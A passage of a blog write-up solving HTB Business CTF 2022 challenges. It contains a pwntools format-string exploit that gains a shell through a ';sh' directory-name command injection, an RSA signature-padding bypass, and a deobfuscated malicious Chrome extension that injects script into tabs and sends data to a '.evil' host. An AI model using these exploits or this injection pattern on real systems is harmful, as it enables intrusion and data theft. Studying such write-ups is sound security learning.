so if I found right offset of v131, can be overwritten by %[offset]$n.   2. After Getting shell..?     MKDR ;sh : make directory named ;sh. itâ€™s legal expression in linux.   CWD ;sh : change working directory to /home/ctf/;sh   LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!!   In the shell, cd /home/ctf =&gt; I noticed that get_flag fileâ€™s RUNPATH is ./, so changing working directory to /home/ctf is necessary.   In the shell, ./get_flag =&gt; Execute!   In the shell, exit =&gt; for receiving results of entire commands.  (because commands is running in popen process)   3. Exploit Code  from pwn import *  #context.log_level = 'debug'  p = remote(\"104.248.175.153\",30467) #p = process('./chall')  def qwer(x, noRecv=False):         if not noRecv:  p.recv()         p.send(x)         sleep(0.5)  qwer(\"USER ;)\") qwer(\"PASS ;)\")  qwer(\"BKDR %p %p %p %p %p %p %p\") p.recvuntil(\"(nil) 0x\") leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak))  pay = b'BKDR' pay += b' %1035$n'  #pause() pay = pay.ljust(0x28-3, b'b') pay += p64(leak) pay += b\"ASDF\" qwer(pay)  #qwer(\"STOR .profile\") #qwer(\"alias ls='sh;ls'\".ljust(0x1000, 'a') + 'LIST', True) #p.shutdown('send')  qwer(\"MKDR ;sh\") qwer(\"CWD ;sh\") qwer(\"LIST\")  p.sendline(\"cd /home/ctf\") p.sendline(\"./get_flag\") p.sendline(\"exit\") p.interactive()   Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}.     PWN : OpenDoor  ! REDACTED !  Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb     CRYPTO : BBGun06  1. Analyze   BBGun06 / revenge has same verify(self,message, signature) code:  def verify(self, message, signature):         keylength = len(long_to_bytes(self.n))         decrypted = self.encrypt(signature)         clearsig = decrypted.to_bytes(keylength, \"big\")          r = re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL)         m = r.match(clearsig)          if not m:             raise VerificationError('Verification failed')          if m.group(1) != self.asn1:             raise VerificationError('Verification failed')          if m.group(2) != sha1(message).digest():             raise VerificationError('Verification failed')          return True   And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer.  Decrypted message is same when I give bytes string that has same integer result. That means, dec(\"0001\") == dec(\"01\"). Itâ€™s simple!  send given signature with 00 :D, 00 + sig  revenge prob has the same solving process lol:) See below.  2. Exploit (Manual)  // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10  ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32'06_519n47u23_f02932y}  signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f  ...  Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32's}     CRYPTO : ElElGamal  I didnâ€™t know about ElGamal in cryptography, so I searched a lot.  writingâ€¦ â€”   REV : BreakOut   1. FLAG Recovering     Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running!   Download bkd file in website.   Realize itâ€™s web server made by C++.   Find secretGet function and get flag.   2. Get FLAG     Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}.     REV : ChromeMiner   Fully obfuscated js Challenge.   1. Recover with hand  async function iF() {   if (!('injected' in document)) {     document['injected'] = true;     window['setInterval'](async () =&gt; {       y = new window['Uint8Array'](64);       window['crypto']['getRandomValues'](y);       if (new window['TextDecoder']('utf-8')['decode'](await window['crypto']['subtle']['digest']('sha-256', y))['endsWith']('chrome')) {         j = new window['Uint8Array'](y['byteLength'] + (await window['crypto']['subtle']['digest']('sha-256', y))['byteLength']);         j['set'](new window['Uint8Array'](y), 0);         j['set'](new window['Uint8Array'](await window['crypto']['subtle']['digest']('sha-256', y)), y['byteLength']);         window['fetch']('hxxps://qwertzuiop123.evil/' +          [...new window['Uint8Array'](await window['crypto']['subtle']['encrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', await window['crypto']['subtle']['decrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_'), {['name']: 'AES-CBC'}, true, ['decrypt']), new window['Uint8Array'](('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')['match'](/../g)['map'](h =&gt; window['parseInt'](h, 16)))), {['name']: 'AES-CBC'}, true, ['encrypt']), j))]['map'](x =&gt; x['toString'](16)['padStart'](2, \"0\"))['join'](\"\"));       }     }, 1);   } } ;  chrome['tabs']['onUpdated']['addListener']((tabVar, changeInfo, tab) =&gt; {   if ('url' in tab &amp;&amp; tab['url'] != null &amp;&amp; (tab['url']['startsWith']('https://') || tab['url']['startsWith']('http://'))) {     chrome['scripting']['executeScript']({['target']: {['tabId']: tab['id']}, function: iF});   } });   2. Decrypt with AES-256  &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &gt;&gt;&gt; cipher.decrypt(b'\\xe2B\\xe6Ba\\xd2\\x19i\\xf6[\\xed\\xf9T\\x90\\n\\x99R\\t\\t\\x9f\\xb6\\xc3\\xc6\\x82\\xc0\\xd9\\xc4\\xb2u\\xb1\\xc2\\x12\\xbc\\x18\\x8e\\x08\\x82\\xb6\\xber\\xc7I!\\x12A\\x18\\x7f\\xa8') b'HTB{__mY_vRy_owN_CHR0me_M1N3R__}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10'     FOR : Linaâ€™s Invitation  writingâ€¦.  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/htb_businessctf_2022/",
        "teaser": null
      }]
